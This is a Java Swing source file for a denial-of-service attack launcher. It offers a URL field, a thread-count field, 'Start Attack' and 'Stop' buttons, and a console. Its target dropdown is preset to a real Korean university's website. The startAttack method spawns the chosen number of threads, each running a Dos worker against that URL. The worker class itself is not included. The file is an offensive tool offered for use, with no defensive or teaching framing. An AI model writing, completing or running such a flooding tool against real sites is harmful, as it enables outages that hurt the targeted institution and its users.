// DosGUI.java
package test;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URI;
import java.util.ArrayList;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;

public class DosGUI {

   private JFrame frame;
   private JTextField urlTextField;
   private JTextField threadTextField;
   private JTextArea consoleTextArea;
   private JButton startButton;
   private JButton stopButton;
   private boolean isAttacking = false;

   private ArrayList<Dos> dosInstances = new ArrayList<>();

   private static final String[] TARGET_OPTIONS = { "신구대학교", "Example2", "Example3" };

   public static void main(String[] args) {
      SwingUtilities.invokeLater(() -> {
         try {
            DosGUI window = new DosGUI();
            window.frame.setVisible(true);
         } catch (Exception e) {
            e.printStackTrace();
         }
      });
   }

   public DosGUI() {
      initialize();
   }

   private void initialize() {
      frame = new JFrame();
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

      JPanel contentPane = new JPanel();
      contentPane.setBackground(Color.BLACK);
      frame.setContentPane(contentPane);
      contentPane.setLayout(null);

      JPanel urlPanel = new JPanel();
      urlPanel.setLayout(null);
      urlPanel.setForeground(Color.WHITE);
      urlPanel.setBorder(new TitledBorder(new LineBorder(new Color(255, 255, 255), 2), "Select your target",
            TitledBorder.LEADING, TitledBorder.TOP, null, new Color(255, 255, 255)));
      urlPanel.setBackground(Color.BLACK);
      urlPanel.setBounds(10, 10, 764, 100);
      contentPane.add(urlPanel);

      urlTextField = new JTextField();
      urlTextField.setForeground(Color.WHITE);
      urlTextField.setFont(new Font("굴림", Font.BOLD, 15));
      urlTextField.setColumns(10);
      urlTextField.setBackground(Color.BLACK);
      urlTextField.setBounds(50, 29, 594, 45);
      urlPanel.add(urlTextField);

      JLabel urlLabel = new JLabel("URL");
      urlLabel.setForeground(Color.WHITE);
      urlLabel.setFont(new Font("굴림", Font.BOLD, 15));
      urlLabel.setBounds(12, 44, 47, 15);
      urlPanel.add(urlLabel);

      JComboBox<String> comboBox = new JComboBox<>(TARGET_OPTIONS);
      comboBox.addActionListener(new ActionListener() {
         public void actionPerformed(ActionEvent e) {
            String selectedTarget = comboBox.getSelectedItem().toString();
            if ("신구대학교".equals(selectedTarget)) {
               urlTextField.setText("https://www.shingu.ac.kr/index.do");
            } else if ("Example2".equals(selectedTarget)) {
               urlTextField.setText("https://example2.com");
            } else if ("Example3".equals(selectedTarget)) {
               urlTextField.setText("https://example3.com");
            }
         }
      });

      comboBox.setBounds(643, 29, 96, 45);
      urlPanel.add(comboBox);

      JPanel threadPanel = new JPanel();
      threadPanel.setLayout(null);
      threadPanel.setForeground(Color.WHITE);
      threadPanel.setBorder(new TitledBorder(new LineBorder(new Color(255, 255, 255)), "Thread", TitledBorder.LEADING,
            TitledBorder.TOP, null, new Color(255, 255, 255)));
      threadPanel.setBackground(Color.BLACK);
      threadPanel.setBounds(10, 112, 530, 81);
      contentPane.add(threadPanel);

      JLabel threadLabel = new JLabel("Thread:");
      threadLabel.setForeground(Color.WHITE);
      threadLabel.setFont(new Font("굴림", Font.BOLD, 15));
      threadLabel.setBounds(12, 36, 70, 15);
      threadPanel.add(threadLabel);

      threadTextField = new JTextField();
      threadTextField.setForeground(Color.WHITE);
      threadTextField.setFont(new Font("굴림", Font.BOLD, 15));
      threadTextField.setColumns(10);
      threadTextField.setBackground(Color.BLACK);
      threadTextField.setBounds(95, 21, 423, 45);
      threadPanel.add(threadTextField);

      startButton = new JButton("Start Attack");
      startButton.setForeground(Color.WHITE);
      startButton.setFont(new Font("굴림", Font.BOLD, 15));
      startButton.setEnabled(true);
      startButton.setBorder(new LineBorder(Color.WHITE));
      startButton.setBackground(Color.BLACK);
      startButton.setBounds(10, 203, 647, 73);
      contentPane.add(startButton);

      JButton clearButton = new JButton("Clear");
      clearButton.setForeground(Color.WHITE);
      clearButton.setFont(new Font("굴림", Font.BOLD, 15));
      clearButton.setBorder(new LineBorder(Color.WHITE));
      clearButton.setBackground(Color.BLACK);
      clearButton.setBounds(552, 120, 105, 73);
      contentPane.add(clearButton);

      JButton webButton = new JButton("Web");
      webButton.setForeground(Color.WHITE);
      webButton.setFont(new Font("굴림", Font.BOLD, 15));
      webButton.setBorder(new LineBorder(Color.WHITE));
      webButton.setBackground(Color.BLACK);
      webButton.setBounds(669, 120, 105, 73);
      contentPane.add(webButton);

      JPanel Scroll = new JPanel();
      Scroll.setForeground(Color.WHITE);
      Scroll.setBorder(new TitledBorder(new LineBorder(new Color(255, 255, 255)), "Console", TitledBorder.LEADING,
            TitledBorder.TOP, null, new Color(255, 255, 255)));
      Scroll.setBackground(Color.BLACK);
      Scroll.setBounds(10, 286, 764, 364);
      contentPane.add(Scroll);
      Scroll.setLayout(new BorderLayout());

      consoleTextArea = new JTextArea();
      consoleTextArea.setEditable(false);
      consoleTextArea.setBackground(Color.BLACK);
      consoleTextArea.setForeground(Color.WHITE);
      consoleTextArea.setFont(new Font("Monospaced", Font.PLAIN, 14));
      consoleTextArea.setLineWrap(true);

      JScrollPane consoleScrollPane = new JScrollPane(consoleTextArea);
      Scroll.add(consoleScrollPane, BorderLayout.CENTER);

      CustomOutputStream customOutputStream = new CustomOutputStream(consoleTextArea);
      PrintStream printStream = new PrintStream(customOutputStream, true);

      System.setOut(printStream);

      DocumentListener documentListener = new DocumentListener() {
         @Override
         public void insertUpdate(DocumentEvent e) {
            updateStartButton();
         }

         @Override
         public void removeUpdate(DocumentEvent e) {
            updateStartButton();
         }

         @Override
         public void changedUpdate(DocumentEvent e) {
            updateStartButton();
         }

         private void updateStartButton() {
            String threadAmount = threadTextField.getText();
            String url = urlTextField.getText();
            startButton.setEnabled(!threadAmount.isEmpty() && !url.isEmpty() && !isAttacking);
         }
      };

      threadTextField.getDocument().addDocumentListener(documentListener);
      urlTextField.getDocument().addDocumentListener(documentListener);

      startButton.addActionListener(new ActionListener() {
         @Override
         public void actionPerformed(ActionEvent e) {
            new Thread(() -> startAttack()).start();
         }
      });

      clearButton.addActionListener(new ActionListener() {
         @Override
         public void actionPerformed(ActionEvent e) {
            consoleTextArea.setText("");
         }
      });

      webButton.addActionListener(new ActionListener() {
         @Override
         public void actionPerformed(ActionEvent e) {
            openWebPage("https://www.shingu.ac.kr/index.do");
         }
      });

      stopButton = new JButton("Stop");
      stopButton.setBackground(Color.RED);
      stopButton.setForeground(Color.WHITE);
      stopButton.setFont(new Font("굴림", Font.BOLD, 15));
      stopButton.setBounds(669, 203, 105, 73);
      contentPane.add(stopButton);

      stopButton.addActionListener(new ActionListener() {
         @Override
         public void actionPerformed(ActionEvent e) {
            stopAttack();
         }
      });

      frame.setMinimumSize(new Dimension(800, 700));
      frame.setLocationRelativeTo(null);
      frame.setResizable(false);
   }

   private static class CustomOutputStream extends OutputStream {
      private JTextArea textArea;

      public CustomOutputStream(JTextArea textArea) {
         this.textArea = textArea;
      }

      @Override
      public void write(int b) throws IOException {
         SwingUtilities.invokeLater(() -> {
            textArea.append(String.valueOf((char) b));
            textArea.setCaretPosition(textArea.getDocument().getLength());
         });
      }
   }

   private void startAttack() {
      String url = urlTextField.getText();
      String threadAmount = threadTextField.getText();

      try {
         consoleTextArea.setText("");

         Dos.amount = Integer.parseInt(threadAmount);
         Dos.url = url;

         int ioption = (url.startsWith("https")) ? 2 : 1;

         ArrayList<Thread> threads = new ArrayList<>();
         for (int i = 0; i < Dos.amount; i++) {
            Dos dos = new Dos(i, ioption);
            dosInstances.add(dos);
            Thread t = new Thread(dos);
            t.start();
            threads.add(t);
         }

         isAttacking = true;
         startButton.setEnabled(false);

         for (Thread t : threads) {
            try {
               t.join();
            } catch (InterruptedException ex) {
               ex.printStackTrace();
            }
         }

         JOptionPane.showMessageDialog(frame, "Attack Completed.");
      } catch (NumberFormatException ex) {
         JOptionPane.showMessageDialog(frame, "값이 잘못되었습니다. 유효한 값을  입력하세요..");
      } catch (Exception ex) {
         ex.printStackTrace();
      } finally {
         isAttacking = false;
         startButton.setEnabled(true);
      }
   }

   private void stopAttack() {
      for (Dos dos : dosInstances) {
         dos.stopAttack();
      }
      isAttacking = false;
      startButton.setEnabled(true);
   }

   private static void openWebPage(String url) {
      try {
         Desktop.getDesktop().browse(new URI(url));
      } catch (Exception e) {
         e.printStackTrace();
      }
   }
}